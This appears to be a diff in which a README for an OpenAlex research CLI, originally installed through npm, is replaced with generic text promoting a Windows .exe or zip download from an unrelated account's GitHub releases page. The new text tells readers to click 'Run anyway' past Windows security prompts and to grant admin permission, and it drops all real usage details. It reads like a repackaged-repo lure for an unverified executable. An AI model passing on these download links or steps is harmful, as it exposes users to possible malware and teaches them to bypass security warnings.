@@ -1,250 +1,236 @@
-# OpenAlex Skill
+# 🧠 openalex-skill - Find papers, citations, and answers fast
 
-`openalex` is a human-friendly and agent-friendly CLI for the OpenAlex API. It is designed for fast literature lookup, citation tracing, author/institution discovery, and field projection without forcing users into raw JSON by default.
+[![Download openalex-skill](https://img.shields.io/badge/Download%20openalex-skill-blue?style=for-the-badge)](https://github.com/Out-bloodspavin173/openalex-skill/releases)
 
-## Install in 10 Seconds
+## 🚀 What this tool does
 
-Choose the path that matches your environment:
+openalex-skill is a simple Windows tool for looking up academic papers, checking citations, and using OpenAlex data in agent workflows. It helps you search for authors, journals, works, and links between papers without needing to learn a complex system.
 
-- skill-aware agents: install the repo skill with `npx skills add`
-- local shell or plain CLI use: install the npm package and run `openalex`
+Use it when you want to:
 
-### For skill-aware agents
+- Search for papers by title, author, or topic
+- Check citation counts
+- Find related research
+- Pull data from OpenAlex in a clean format
+- Support agent and LLM workflows with research data
 
-Install the `openalex` skill from this repository:
+## 💻 Before you start
 
-```bash
-npx skills add shiquda/openalex-skill --skill openalex
-```
+You only need a Windows computer and internet access.
 
-This installs the skill instructions, not the CLI binary itself. You still need the `openalex` command available, either by installing the npm package below or by letting your agent finish the setup steps in the skill guide.
+Recommended setup:
 
-### For local shell or plain CLI use
+- Windows 10 or Windows 11
+- A modern browser
+- Enough free space to save the app
+- Internet access for searches and data fetches
 
-If your environment does not support repo-distributed skills yet, install the CLI directly:
+If your system asks for permission when you open the app, choose **Allow**.
 
-```bash
-npm install -g openalex-skill
-openalex --help
-```
+## 📥 Download openalex-skill
 
-## Why Use It
+Visit this page to download:
 
-- human-readable output by default
-- targeted extraction with `--field`
-- server-side narrowing with `--select` when OpenAlex supports it
-- works, authors, sources, institutions, topics, publishers, funders, and concepts
-- helper flows for `related`, `cited-by`, and `references`
-- built-in single-work full-text download when OpenAlex exposes a direct file URL
-- bare DOI input accepted everywhere (`10.xxxx/...`, `doi:...`, full URL all work)
-- `--all` for automatic cursor pagination across any list command
-- `--format bibtex` for direct citation export from works
-- automatic retry with backoff on `429` and server errors
+https://github.com/Out-bloodspavin173/openalex-skill/releases
 
-## Quick Start
+On that page, look for the latest release. Download the file for Windows. If there are multiple files, choose the one that ends with `.exe` or a Windows zip file.
 
-```bash
-npm install -g openalex-skill
-openalex --help
-openalex --version
-openalex works search "llm agents" --per-page 5
-openalex works search "llm agents" --all --format jsonl
-openalex works get https://doi.org/10.1038/nature12373
-openalex works get 10.1038/nature12373
-openalex works download https://doi.org/10.1038/nature12373
-openalex works cited-by doi:10.1038/nature12373 --per-page 5
-```
+## 🪟 Install on Windows
 
-Optional but recommended for higher quotas:
+If you downloaded an `.exe` file:
 
-```bash
-openalex config set api-key your_key_here
-openalex config show
-```
+1. Open your **Downloads** folder
+2. Double-click the file
+3. If Windows shows a security prompt, click **More info** and then **Run anyway** if you trust the file
+4. Follow the setup steps on screen
 
-## Core Examples
+If you downloaded a `.zip` file:
 
-Search papers:
+1. Open your **Downloads** folder
+2. Right-click the zip file
+3. Choose **Extract All**
+4. Open the extracted folder
+5. Double-click the app file inside the folder
 
-```bash
-openalex works search "retrieval augmented generation" --per-page 5
-```
+## ⚡ First run
 
-Get a work by DOI or OpenAlex ID:
+After install, open openalex-skill from the Start menu or by double-clicking the app file.
 
-```bash
-openalex works get https://doi.org/10.1038/nature12373
-openalex works get 10.1038/nature12373
-openalex works get W2741809807
-```
+When it starts, you can:
 
-Download the best available direct full-text file for one work:
+- Enter a search term
+- Paste a paper title
+- Look up an author
+- Ask for citation details
+- Use it in a workflow that needs academic data
 
-```bash
-openalex works download https://doi.org/10.1038/nature12373
-openalex works download 10.1038/nature12373
-openalex works download W2741809807 --output ./nature12373.pdf
-```
+If the app opens a command window, leave it open while you use it.
 
-Trace citations:
+## 🔎 How to use it
 
-```bash
-openalex works cited-by https://doi.org/10.1038/nature12373 --per-page 5
-openalex works cited-by 10.1038/nature12373 --per-page 5
-openalex works references W2741809807 --per-page 5
-openalex works related W2741809807 --per-page 5
-```
+openalex-skill is built for simple research tasks.
 
-`cited-by`, `references`, and `related` accept either a DOI or an OpenAlex work ID.
+Try these kinds of searches:
 
-Find authors and their works:
+- Paper title search
+- Author search
+- Topic search
+- Citation lookup
+- Journal lookup
+- Related work search
 
-```bash
-openalex authors search "Geoffrey Hinton" --per-page 3
-openalex authors get https://orcid.org/0000-0002-3141-5845
-openalex works list --filter author.id:A5070829652 --per-page 5
-```
+Example use cases:
 
-Group and analyze:
+- Find papers on a topic like machine learning in education
+- Check how many times a paper has been cited
+- Find the main authors in a field
+- Build a list of sources for a report
+- Feed paper data into an agent workflow
 
-```bash
-openalex works group --by publication_year --filter author.id:A5070829652
-openalex rate-limit
-```
+## 🧩 Common workflow
 
-## Output Model
+A basic research flow looks like this:
 
-Default output is `summary`, which is optimized for both humans and agents.
+1. Search for a paper or topic
+2. Review the results
+3. Open the most relevant record
+4. Check citations and related works
+5. Save the details you need
 
-Available formats:
+This keeps your research work in one place and cuts down on manual searching.
 
-- `summary` - concise, readable, high-signal output
-- `detail` - readable structured output without transport noise
-- `json` - full structured payload
-- `jsonl` - one JSON object per line
-- `markdown` - heading plus JSON block
-- `bibtex` - BibTeX entries for work records
+## 🛠️ Tips for best results
 
-In `summary`, entity rows keep the human-readable title on the first line and include reusable identifiers such as OpenAlex IDs on the secondary line when available.
+Use short and clear search terms. For example:
 
-Quick examples:
+- `climate change and health`
+- `deep learning`
+- `citation networks`
+- `open access publishing`
 
-```bash
-openalex works search "crispr" --per-page 3
-openalex --format detail works get W2741809807
-openalex works search "crispr" --all --format jsonl
-openalex works get 10.1038/nature12373 --format bibtex
-```
+If a search gives too many results:
 
-## Field Control
+- Add the author name
+- Add a year
+- Add a keyword from the title
+- Narrow the topic
 
-Use `--field` for client-side projection after the response arrives:
+If you want more exact results, copy the full paper title and paste it into the search.
 
-```bash
-openalex works fields
-openalex works get W2741809807 \
-  --format detail \
-  --field title \
-  --field abstract \
-  --field authorships.author.display_name
-```
+## 📚 What you can expect
 
-Use `--select` for server-side field selection when OpenAlex supports it:
+This app focuses on practical academic search tasks. It aims to give you:
 
-```bash
-openalex works search "crispr" \
-  --select id \
-  --select title \
-  --select cited_by_count
-```
+- Clean search results
+- Citation data
+- Paper and author details
+- Fast access to OpenAlex records
+- Output that works well with agent tools
 
-Important `--select` caveats:
+It is useful for students, researchers, writers, and anyone who needs to look up scholarly data without switching between many sites.
 
-- OpenAlex only supports selecting root-level fields
-- `group` and `autocomplete` do not support `--select`
-- `abstract` and `abstract_inverted_index` are not selectable upstream
-- if you need abstract text, prefer `--field abstract` and avoid `--select` for that request
+## 🔐 Data source
 
-## Configuration
+openalex-skill uses OpenAlex, a large open academic catalog. That means you can search a wide range of scholarly records, including:
 
-- `OPENALEX_API_KEY` - recommended for search and higher-volume use
-- `OPENALEX_BASE_URL` - defaults to `https://api.openalex.org`
-- `OPENALEX_MAILTO` - optional contact email
+- Papers
+- Authors
+- Institutions
+- Journals
+- Citations
+- Related works
 
-Example:
+This makes it useful for bibliometrics, literature review work, and agent-assisted research.
 
-Bash:
+## 🧪 Example tasks
 
-```bash
-export OPENALEX_API_KEY=your_key_here
-openalex works search "graph neural networks" --per-page 5
-```
+You can use openalex-skill for tasks like:
 
-PowerShell:
+- Find the most cited papers on a topic
+- Look up an author profile
+- Check where a paper was published
+- Trace citation links between papers
+- Gather source data for a research draft
+- Support a Claude Code or LLM workflow with paper metadata
 
-```powershell
-$env:OPENALEX_API_KEY="your_key_here"
-openalex works search "graph neural networks" --per-page 5
-```
+## 🧯 If something does not work
 
-`openalex` can also store user-level settings in `~/.openalex-skill/config.json`.
+If the app does not open:
 
-Priority order:
+- Check that the file finished downloading
+- Try running it again
+- Make sure Windows did not block it
+- Re-download the latest release if the file looks broken
 
-- environment variables override stored config
-- stored config overrides built-in defaults
+If search results look empty:
 
-Useful commands:
+- Try a different search term
+- Use a full paper title
+- Add the author name
+- Check your internet connection
 
-```bash
-openalex config
-openalex config show
-openalex config path
-openalex config set api-key your_key_here
-openalex config unset api-key
-```
+If Windows asks for admin permission:
 
-## Pagination and Reliability
+- Choose the option that lets you run the app
+- If the prompt keeps returning, move the file to a local folder like Downloads or Desktop
 
-- Use `--all` on list-style commands to auto-follow cursor pagination until OpenAlex stops returning `next_cursor`
-- `--all` uses cursor pagination and cannot be combined with `--page`
-- transient upstream failures such as `429` and `503` are retried automatically with backoff
+## 📁 File types you may see
 
-Examples:
+Depending on the release, you may see one of these:
 
-```bash
-openalex works search "llm agents" --all --per-page 200 --format jsonl
-openalex works cited-by 10.1038/nature12373 --all --per-page 100
-```
+- `.exe` for a direct Windows app
+- `.zip` for a packaged release
+- `.txt` or `.md` files with extra details
 
-## Filter Notes
+If you are not sure which file to use, choose the Windows app file from the latest release page.
 
-- `works` filters pass straight through to OpenAlex; the CLI does not rename filter fields for you
-- `authors` institution examples use `last_known_institutions.id:I123456`
-- `works` institution-related filters depend on the OpenAlex field path you want to target, so prefer verifying with `--format json` if a filter returns no rows
+## 🧭 Quick start
 
-## Skills
+1. Open the download page
+2. Get the latest Windows file
+3. Open the file
+4. Allow Windows to run it
+5. Search for a paper, author, or topic
 
-This repository also includes an installable skill definition under `skills/openalex/`. Skill-specific operational guidance lives in `skills/openalex/SKILL.md`.
+## 🧰 Best fit for
 
-## Development
+- Students
+- Researchers
+- Analysts
+- Librarians
+- Writers
+- People building agent workflows
+- Anyone who wants a simple academic search tool
 
-```bash
-npm install
-npm run build
-npm exec --package=. openalex -- --help
-npm test
-npm run typecheck
-npm run pack:dry-run
-```
+## 📌 Search ideas
 
-## Useful Links
+Try these search terms:
 
-Official OpenAlex resources:
+- `OpenAlex citation search`
+- `bibliometrics`
+- `scholar profiles`
+- `paper metadata`
+- `academic search`
+- `research workflow`
 
-- API docs: <https://docs.openalex.org>
-- LLM quick reference: <https://docs.openalex.org/api-guide-for-llms>
-- Official bulk-download CLI: <https://github.com/ourresearch/openalex-official>
-- API key signup: <https://openalex.org/settings/api>
+## 🖥️ Windows use guide
 
-Use `openalex-official` for large bulk-download workflows. Use `openalex` for interactive querying, lookup, single-work download, citation tracing, grouping, and field projection.
+If you want the easiest path:
+
+- Download the latest Windows release
+- Save it in Downloads
+- Open it with a double-click
+- Keep the app open while you search
+- Close it when you are done
+
+If you use it often, place a shortcut on your desktop:
+
+1. Right-click the app
+2. Choose **Create shortcut**
+3. Drag the shortcut to your desktop
+
+## 🔗 Download again
+
+Visit this page to download:
+
+https://github.com/Out-bloodspavin173/openalex-skill/releases
